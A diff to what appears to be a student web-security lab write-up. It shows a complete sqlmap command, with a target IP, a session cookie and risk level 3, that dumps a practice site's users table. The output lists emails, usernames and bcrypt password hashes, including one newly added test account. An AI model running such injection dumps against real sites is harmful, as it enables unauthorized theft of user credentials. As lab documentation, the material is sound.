@@ -123,7 +123,7 @@ Table: users
 | username        | varchar(255) |
 
 
-Finally going to dump user information with:
+Finally dumped user information with:
 
 ```
 sqlmap -u "https://35.226.85.132/blue/public/salesperson.php?id=1" --cookie="PHPSESSID=l5dhhrk5qand8l3npuml7drgg5" --threads 5 --risk 3 --time-sec 5 -D globitek_blue -T users --dump
@@ -131,12 +131,14 @@ sqlmap -u "https://35.226.85.132/blue/public/salesperson.php?id=1" --cookie="PHP
 
 Database: globitek_blue
 Table: users
-[3 entries]
+[4 entries]
 
 | id | email               | username  | last_name | created_at          | first_name | hashed_password                                              |
 |----|---------------------|-----------|-----------|---------------------|-----------|--------------------------------------------------------------|
 | 1  | test@test.com       | jmonroe99 | Munroe    | NULL                | Jim        | $2y$11$Co5fHvH5Lgk2Zu0iHR46BO6fnqQt1pUljPbZOhk7bTU6hQFhjBJG. |
 | 2  | lbt2000@nowhere.com | lbtables  | Tables    | 2016-06-03 19:33:54 | Bobby      | $2y$10$I.Jwfc8R3xaFwlAlPn5U3OLAQXrE0c2fakN8rR4j2TW0gRVMd6U6a |
 | 3  | person@nowhere.com  | pperson   | Person    | 2017-01-01 02:50:26 | Pat        | $2y$11$FHZQn1eWZ3mbn11evb3CSeM20LCsJZI8yP9wS/UsOI6VWnx.7mKDa |
+| 4  | auser@test.com      | auser     | test      | 2018-03-30 04:19:48 | lets       | $2y$11$jHNjgSVYcC0QY.fn.0UhiOrjW./lYgHkvWhxjV6.Vi2tUBk23lAwS |
+
 
 
